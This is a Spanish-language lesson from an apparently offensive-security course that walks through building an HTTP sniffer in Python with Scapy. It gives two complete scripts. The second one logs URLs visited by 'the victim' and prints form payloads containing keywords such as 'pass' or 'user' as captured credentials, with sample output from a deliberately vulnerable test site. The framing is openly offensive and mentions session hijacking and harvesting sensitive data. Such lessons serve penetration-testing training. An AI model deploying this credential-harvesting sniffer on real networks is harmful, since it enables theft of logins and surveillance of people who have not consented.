
----
- TAG: #Creación #Sniffer #HTTP #Scapy 
----
En esta clase, desarrollaremos un rastreador de consultas HTTP (HTTP Sniffer) enfocado en técnicas ofensivas. El HTTP Sniffer es una herramienta crucial para interceptar y analizar el tráfico HTTP en una red, lo que permite revelar información crítica como cabeceras HTTP, URLs solicitadas, y posiblemente datos de formularios y cookies. Estos datos son esenciales para comprender la comunicación entre clientes y servidores web, y pueden ser explotados para varios tipos de ataques, incluyendo la inyección de código, el secuestro de sesiones y la recopilación de información sensible.

A lo largo de la clase, te enseñaremos cómo capturar de manera efectiva este tipo de tráfico utilizando Scapy, y cómo analizarlo para identificar puntos débiles y oportunidades de ataque en una red. Esta habilidad es invaluable para cualquier estrategia ofensiva en ciberseguridad, proporcionándote un entendimiento profundo de cómo fluye la información en la web y cómo puede ser manipulada para fines de ataque.

---

### Sniffing de Tráfico HTTP con Scapy

En la clase anterior, creamos un script llamado `dns_sniffer.py` que nos permitía capturar y visualizar los nombres de dominio DNS. Para llevarlo un paso más allá y obtener información más detallada, ahora vamos a construir un sniffer que capture tráfico **HTTP**. Aunque la mayoría de las comunicaciones web actuales utilizan HTTPS, los dominios DNS se envían en texto claro, por lo que podemos interceptar las solicitudes DNS para ver qué dominios visita el usuario.

En esta práctica, interceptaremos tráfico HTTP y extraeremos credenciales que se envíen por formularios no cifrados. Utilizaremos la página vulnerable `http://testphp.vulnweb.com/login.php` para realizar la práctica.

### Script 1: `http_sniffer.py`

Este script captura las solicitudes HTTP que ocurren en una interfaz de red específica. Utilizamos **Scapy**, una poderosa biblioteca de Python para manipulación y captura de paquetes, y la capa de HTTP proporcionada por Scapy.

#### Código del Script:

```python
#!/usr/bin/python3

import scapy.all as scapy
from scapy.layers import http

# Función que procesa los paquetes capturados
def process_packet(packet):
    # Verifica si el paquete tiene una capa HTTPRequest
    if packet.haslayer(http.HTTPRequest):
        # Muestra el paquete completo
        print(packet.show())

# Función que realiza el sniffing de la interfaz especificada
def sniff(interface):
    # Llama a scapy.sniff para capturar los paquetes en la interfaz
    scapy.sniff(iface=interface, prn=process_packet, store=0)

# Función principal del script
def main():
    # Inicia el sniffing en la interfaz eth0
    sniff("eth0")

if __name__ == '__main__':
    main()
```

#### Explicación:

1. **Importación de Módulos**: Se importan las funciones de Scapy necesarias para el sniffing y para manejar las capas HTTP.
   
2. **Función `process_packet`**: Cada paquete capturado es procesado por esta función. Si el paquete tiene una capa `HTTPRequest`, significa que es una solicitud HTTP. La función imprime el contenido del paquete usando `packet.show()`, lo cual muestra información detallada del paquete.

3. **Función `sniff`**: Se utiliza `scapy.sniff` para capturar los paquetes de la interfaz especificada. El argumento `prn=process_packet` indica que cada paquete capturado será procesado por la función `process_packet`.

4. **Función `main`**: Simplemente llama a la función `sniff` con la interfaz de red `eth0`, que suele ser la interfaz de una red Ethernet.

---

### Mejorando el Sniffer para Capturar Credenciales

En este paso, vamos a mejorar el script para filtrar los paquetes HTTP y detectar posibles credenciales enviadas en formularios web, como nombres de usuario y contraseñas. Usaremos palabras clave comunes como "login", "user", "pass", y "mail" para buscar datos sensibles.

#### Código Mejorado del Script:

```python
#!/usr/bin/python3

import scapy.all as scapy
from scapy.layers import http
from termcolor import colored
import signal 
import sys

# Manejo de señales para salir limpiamente con Ctrl + C
def def_handler(sig, frame):
    print(colored(f"\n[!] Saliendo...\n", 'red'))
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)  # Captura de Ctrl+C

# Función para procesar cada paquete capturado
def process_packet(packet):
    
    # Lista de palabras clave comunes para credenciales
    cred_keywords = ["login", "user", "pass", "mail"]
    
    # Si el paquete es una solicitud HTTP
    if packet.haslayer(http.HTTPRequest):
        
        # Reconstruir la URL visitada
        url = "http://" + packet[http.HTTPRequest].Host.decode() + packet[http.HTTPRequest].Path.decode()
        print(colored(f"[+] URL visitada por la víctima: {url}", 'blue'))
        
        # Si el paquete tiene datos en la capa Raw (datos en texto plano)
        if packet.haslayer(scapy.Raw):
            try:
                # Decodifica la carga útil del paquete
                response = packet[scapy.Raw].load.decode()
                
                # Busca palabras clave en la carga útil
                for keyword in cred_keywords:
                    if keyword in response:
                        print(colored(f"\n[+] Posibles credenciales: {response}\n", 'green'))
                        break

            except:
                pass

# Función que realiza el sniffing en la interfaz especificada
def sniff(interface):
    scapy.sniff(iface=interface, prn=process_packet, store=0)

# Función principal que inicia el sniffing
def main():
    sniff("eth0")

if __name__ == '__main__':
    main()
```

#### Explicación:

1. **Manejo de señales (`def_handler`)**: Hemos agregado un manejador de señales para que el script salga de manera limpia cuando el usuario presione `Ctrl + C`. Esto mejora la experiencia de usuario al detener el script sin errores.

2. **Lista de palabras clave**: Se define una lista de palabras clave (`cred_keywords`) que usualmente aparecen en los formularios web donde se solicitan credenciales, como "login", "user", "pass", y "mail".

3. **Recolección de URLs**: Si el paquete capturado es una solicitud HTTP (`HTTPRequest`), el script construye la URL completa que la víctima está visitando usando el `Host` y `Path`.

4. **Filtrando datos sensibles**: Si el paquete contiene una capa `Raw` (que es donde se almacenan los datos de los formularios), se intenta decodificar su contenido. Si se encuentra una palabra clave en la carga útil, el script imprime el contenido como posibles credenciales.

5. **Salida con colores**: Utilizamos la librería `termcolor` para agregar colores a los mensajes. Esto ayuda a resaltar información importante, como las URLs visitadas y las posibles credenciales capturadas.

---

### Ejecución del Script

Cuando ejecutas este script y pruebas enviando un nombre de usuario y una contraseña en la página de prueba (`http://testphp.vulnweb.com/login.php`), el script debería capturar y mostrar algo similar a:

```bash
[+] URL visitada por la víctima: http://testphp.vulnweb.com/login.php

[+] Posibles credenciales: uname=prueba&pass=prueba
```

Este sniffer es muy útil para prácticas de seguridad en entornos controlados, donde puedes inspeccionar el tráfico y ver cómo los datos viajan en texto claro en las solicitudes HTTP.

---

### Próximos Pasos

En la próxima clase, vamos a profundizar en cómo descifrar tráfico HTTPS y qué técnicas se pueden usar para interceptar y manipular ese tipo de tráfico de manera segura en un entorno de prueba.

